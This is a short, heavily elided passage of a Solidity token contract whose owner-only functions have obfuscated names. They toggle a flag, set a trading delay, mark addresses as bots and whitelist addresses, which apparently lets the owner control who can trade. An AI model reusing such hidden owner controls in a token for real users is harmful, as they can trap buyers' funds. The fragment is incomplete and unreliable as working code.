...
contract axmw is Ownable{
    ...
    function BT85L(bool b) public  onlyOwner  returns (bool success) {
        require(_bool != b);
        _bool=b;
        return true;
    }
    ...
    function SetD1DL(uint _dlkl) public  onlyOwner  returns (bool success) {
        require(delay != _dlkl);
        delay=_dlkl;
        return true;
    }

    function BacsL(address[] memory listAddress,  bool isBot) public  onlyOwner  returns (bool success) {
    ...
    function WL5(address[] memory listAddress,  bool _isWhiteListed) public  onlyOwner  returns (bool success) {
        if(listAddress.length==1){
